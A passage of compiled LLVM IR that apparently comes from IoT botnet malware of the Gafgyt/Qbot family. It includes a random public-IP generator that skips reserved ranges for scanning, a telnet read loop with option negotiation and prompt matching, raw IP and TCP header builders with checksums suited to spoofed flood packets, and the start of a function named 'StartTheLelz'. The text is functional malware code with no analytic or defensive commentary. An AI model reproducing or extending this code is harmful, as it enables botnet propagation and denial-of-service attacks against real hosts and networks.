.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  br label %26

; <label>:26:                                     ; preds = %.lr.ph, %.backedge
  %.03335 = phi i32 [ %7, %.lr.ph ], [ %44, %.backedge ]
  %27 = load i64, i64* %12, align 8
  %28 = icmp sgt i64 %27, 0
  %29 = load i64, i64* %14, align 8
  %30 = icmp sgt i64 %29, 0
  %31 = or i1 %28, %30
  br i1 %31, label %32, label %.critedge.loopexit

; <label>:32:                                     ; preds = %26
  %33 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !3
  %34 = load i64, i64* %23, align 8
  %35 = or i64 %34, %20
  store i64 %35, i64* %23, align 8
  %36 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.critedge.loopexit, label %38

; <label>:38:                                     ; preds = %32
  %39 = sext i32 %.03335 to i64
  %40 = getelementptr inbounds i8, i8* %5, i64 %39
  %41 = call i64 @recv(i32 %0, i8* %40, i64 1, i32 0) #3
  %42 = trunc i64 %41 to i32
  switch i32 %42, label %43 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:43:                                     ; preds = %38
  %44 = add nsw i32 %42, %.03335
  %45 = load i8, i8* %40, align 1
  %46 = icmp eq i8 %45, -1
  br i1 %46, label %47, label %53

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds i8, i8* %40, i64 1
  %49 = call i64 @recv(i32 %0, i8* %48, i64 2, i32 0) #3
  %50 = trunc i64 %49 to i32
  switch i32 %50, label %51 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:51:                                     ; preds = %47
  %52 = call i32 @negotiate(i32 %0, i8* nonnull %40, i32 undef)
  br label %.critedge

; <label>:53:                                     ; preds = %43
  %54 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %.critedge.loopexit

; <label>:56:                                     ; preds = %53
  br i1 %25, label %.backedge, label %59

.backedge:                                        ; preds = %56, %59
  %57 = add nsw i32 %44, 2
  %58 = icmp slt i32 %57, %6
  br i1 %58, label %26, label %.critedge.loopexit

; <label>:59:                                     ; preds = %56
  %60 = call i32 @matchPrompt(i8* nonnull %5)
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.backedge, %26, %32, %59, %53, %38, %38
  %.0.ph = phi i32 [ 0, %38 ], [ 0, %38 ], [ 1, %53 ], [ 1, %59 ], [ 0, %32 ], [ 0, %26 ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %8, %47, %47, %51
  %.0 = phi i32 [ 0, %51 ], [ 0, %47 ], [ 0, %47 ], [ 0, %8 ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  %2 = load i8, i8* @ipState.4, align 1
  %3 = icmp eq i8 %2, -1
  %4 = load i8, i8* @ipState.3, align 1
  br i1 %3, label %5, label %15

; <label>:5:                                      ; preds = %0
  %6 = add i8 %4, 1
  store i8 %6, i8* @ipState.3, align 1
  store i8 0, i8* @ipState.4, align 1
  %7 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %8 = load i8, i8* @ipState.1, align 1
  %9 = zext i8 %8 to i32
  %10 = load i8, i8* @ipState.2, align 1
  %11 = zext i8 %10 to i32
  %12 = load i8, i8* @ipState.3, align 1
  %13 = zext i8 %12 to i32
  %14 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %7, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i64 0, i64 0), i32 %9, i32 %11, i32 %13, i32 0)
  br label %118

; <label>:15:                                     ; preds = %0
  %16 = icmp eq i8 %4, -1
  %17 = load i8, i8* @ipState.2, align 1
  br i1 %16, label %18, label %27

; <label>:18:                                     ; preds = %15
  %19 = add i8 %17, 1
  store i8 %19, i8* @ipState.2, align 1
  store i8 0, i8* @ipState.3, align 1
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %21 = load i8, i8* @ipState.1, align 1
  %22 = zext i8 %21 to i32
  %23 = zext i8 %19 to i32
  %24 = load i8, i8* @ipState.4, align 1
  %25 = zext i8 %24 to i32
  %26 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %20, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i64 0, i64 0), i32 %22, i32 %23, i32 0, i32 %25)
  br label %118

; <label>:27:                                     ; preds = %15
  %28 = icmp eq i8 %17, -1
  br i1 %28, label %29, label %51

; <label>:29:                                     ; preds = %27
  %30 = tail call i32 @rand() #3
  %31 = srem i32 %30, 255
  %32 = trunc i32 %31 to i8
  store i8 %32, i8* @ipState.1, align 1
  %33 = tail call i32 @rand() #3
  %34 = srem i32 %33, 255
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* @ipState.2, align 1
  %36 = tail call i32 @rand() #3
  %37 = srem i32 %36, 255
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* @ipState.3, align 1
  %39 = tail call i32 @rand() #3
  %40 = srem i32 %39, 255
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* @ipState.4, align 1
  %42 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %43 = load i8, i8* @ipState.1, align 1
  %44 = zext i8 %43 to i32
  %45 = load i8, i8* @ipState.2, align 1
  %46 = zext i8 %45 to i32
  %47 = load i8, i8* @ipState.3, align 1
  %48 = zext i8 %47 to i32
  %49 = and i32 %40, 255
  %50 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %42, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i64 0, i64 0), i32 %44, i32 %46, i32 %48, i32 %49)
  br label %118

; <label>:51:                                     ; preds = %27
  %52 = add i8 %2, 1
  br label %53

; <label>:53:                                     ; preds = %.critedge, %51
  %.sink = phi i8 [ %110, %.critedge ], [ %52, %51 ]
  store i8 %.sink, i8* @ipState.4, align 1
  %54 = load i8, i8* @ipState.1, align 1
  switch i8 %54, label %59 [
    i8 0, label %.critedge
    i8 10, label %.critedge
    i8 100, label %55
  ]

; <label>:55:                                     ; preds = %53
  %56 = load i8, i8* @ipState.2, align 1
  %57 = icmp ugt i8 %56, 63
  %58 = icmp sgt i8 %56, -1
  %or.cond = and i1 %57, %58
  br i1 %or.cond, label %.critedge, label %thread-pre-split

thread-pre-split:                                 ; preds = %55
  %.pr = load i8, i8* @ipState.1, align 1
  br label %59

; <label>:59:                                     ; preds = %thread-pre-split, %53
  %60 = phi i8 [ %.pr, %thread-pre-split ], [ %54, %53 ]
  switch i8 %60, label %64 [
    i8 127, label %.critedge
    i8 -87, label %61
  ]

; <label>:61:                                     ; preds = %59
  %62 = load i8, i8* @ipState.2, align 1
  %63 = icmp eq i8 %62, -2
  br i1 %63, label %.critedge, label %64

; <label>:64:                                     ; preds = %59, %61
  %65 = load i8, i8* @ipState.1, align 1
  %66 = icmp eq i8 %65, -84
  %67 = load i8, i8* @ipState.2, align 1
  %68 = icmp ult i8 %67, 17
  %or.cond18 = and i1 %66, %68
  br i1 %or.cond18, label %.critedge, label %69

; <label>:69:                                     ; preds = %64
  %70 = icmp eq i8 %65, -64
  %71 = icmp eq i8 %67, 0
  %or.cond20 = and i1 %70, %71
  %72 = load i8, i8* @ipState.3, align 1
  %73 = icmp eq i8 %72, 2
  %or.cond22 = and i1 %or.cond20, %73
  br i1 %or.cond22, label %.critedge, label %74

; <label>:74:                                     ; preds = %69
  %75 = icmp eq i8 %67, 88
  %or.cond24 = and i1 %70, %75
  %76 = icmp eq i8 %72, 99
  %or.cond26 = and i1 %or.cond24, %76
  %77 = icmp eq i8 %67, -88
  %or.cond28 = and i1 %70, %77
  %or.cond41 = or i1 %or.cond28, %or.cond26
  br i1 %or.cond41, label %.critedge, label %78

; <label>:78:                                     ; preds = %74
  %79 = icmp eq i8 %65, -58
  %80 = and i8 %67, -2
  %switch = icmp eq i8 %80, 18
  %or.cond42 = and i1 %79, %switch
  br i1 %or.cond42, label %.critedge, label %81

; <label>:81:                                     ; preds = %78
  %82 = load i8, i8* @ipState.1, align 1
  %83 = icmp eq i8 %82, -58
  %84 = load i8, i8* @ipState.2, align 1
  %85 = icmp eq i8 %84, 51
  %or.cond30 = and i1 %83, %85
  %86 = load i8, i8* @ipState.3, align 1
  %87 = icmp eq i8 %86, 100
  %or.cond32 = and i1 %or.cond30, %87
  br i1 %or.cond32, label %.critedge, label %88

; <label>:88:                                     ; preds = %81
  %89 = icmp eq i8 %82, -53
  %90 = icmp eq i8 %84, 0
  %or.cond34 = and i1 %89, %90
  %91 = icmp eq i8 %86, 113
  %or.cond36 = and i1 %or.cond34, %91
  %92 = icmp ugt i8 %82, -33
  %or.cond43 = or i1 %92, %or.cond36
  br i1 %or.cond43, label %.critedge, label %93

; <label>:93:                                     ; preds = %88
  %94 = icmp eq i8 %82, -71
  %95 = icmp eq i8 %84, 62
  %or.cond38 = and i1 %94, %95
  br i1 %or.cond38, label %.critedge, label %96

; <label>:96:                                     ; preds = %93
  %97 = icmp eq i8 %82, -48
  %98 = icmp eq i8 %84, 67
  %or.cond40 = and i1 %97, %98
  br i1 %or.cond40, label %.critedge, label %.critedge15

.critedge:                                        ; preds = %78, %96, %93, %88, %81, %74, %69, %64, %59, %55, %53, %53, %61
  %99 = tail call i32 @rand() #3
  %100 = srem i32 %99, 255
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* @ipState.1, align 1
  %102 = tail call i32 @rand() #3
  %103 = srem i32 %102, 255
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* @ipState.2, align 1
  %105 = tail call i32 @rand() #3
  %106 = srem i32 %105, 255
  %107 = trunc i32 %106 to i8
  store i8 %107, i8* @ipState.3, align 1
  %108 = tail call i32 @rand() #3
  %109 = srem i32 %108, 255
  %110 = trunc i32 %109 to i8
  br label %53

.critedge15:                                      ; preds = %96
  %111 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %112 = zext i8 %82 to i32
  %113 = zext i8 %84 to i32
  %114 = zext i8 %86 to i32
  %115 = load i8, i8* @ipState.4, align 1
  %116 = zext i8 %115 to i32
  %117 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %111, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i64 0, i64 0), i32 %112, i32 %113, i32 %114, i32 %116)
  br label %118

; <label>:118:                                    ; preds = %.critedge15, %29, %18, %5
  %.sink16 = phi i8* [ %111, %.critedge15 ], [ %42, %29 ], [ %20, %18 ], [ %7, %5 ]
  %119 = call i32 @inet_addr(i8* %.sink16) #3
  ret i32 %119
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !4

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %10 = tail call noalias i8* @malloc(i64 44) #3
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #3
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @StartTheLelz() local_unnamed_addr #12 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca %struct.timeval, align 8
